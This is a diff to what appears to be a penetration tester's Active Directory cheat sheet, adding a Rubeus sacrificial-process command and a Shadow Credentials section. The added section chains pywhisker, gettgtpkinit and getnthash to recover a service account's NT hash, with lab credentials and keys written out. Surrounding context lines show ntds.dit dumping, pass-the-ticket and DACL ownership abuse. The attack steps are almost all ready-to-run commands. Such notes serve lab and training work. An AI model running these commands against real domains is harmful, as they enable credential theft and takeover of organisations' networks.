@@ -798,6 +798,8 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
 # Ticket monitoring
 .\Rubeus.exe monitor /interval:5 /nowrap
 #PTT
+## Sacrificial Process 
+.\Rubeus.exe createnetonly /program:powershell.exe /show
 .\Rubeus.exe asktgs /ticket:BASE64 /service:cifs/dc01.INLANEFREIGHT.local /ptt 
 # TGT renew
 .\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap
@@ -1269,6 +1271,7 @@ Ghostpack
 ```
 
 ### Abuse DACLs
+#### Default
 https://github.com/ShutdownRepo/impacket
 https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py
 
@@ -1325,6 +1328,24 @@ WriteOwner
 python3 examples/owneredit.py -action write -new-owner own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1
 
 python3 examples/dacledit.py -principal own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write
+```
+
+#### Shadow Credential
+GenericAll, GenericWrite WriteProperty 
+
+https://github.com/ShutdownRepo/pywhisker
+https://github.com/dirkjanm/PKINITtools
+```bash
+# Get pfx
+python3 pywhisker.py -d "certified.htb" -u "JUDITH.MADER" -p "judith09" --target "MANAGEMENT_SVC" --action "add" --filename management
+
+# In PKINITtools
+python -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+python3 gettgtpkinit.py -cert-pfx management.pfx -pfx-pass p9bX29Eozi8fT3CEpSvL certified.htb/MANAGEMENT_SVC MANAGEMENT_SVC.ccache
+# key is in gettgtpkinit.py output
+KRB5CCNAME=MANAGEMENT_SVC.ccache python3 getnthash.py -key c5b9e16f65d7f78cf15c8b185bfb75b2d1df367d1f3091392d336a7130669bef certified.htb/MANAGEMENT_SVC 
 ```
 
 ### LOLBIN
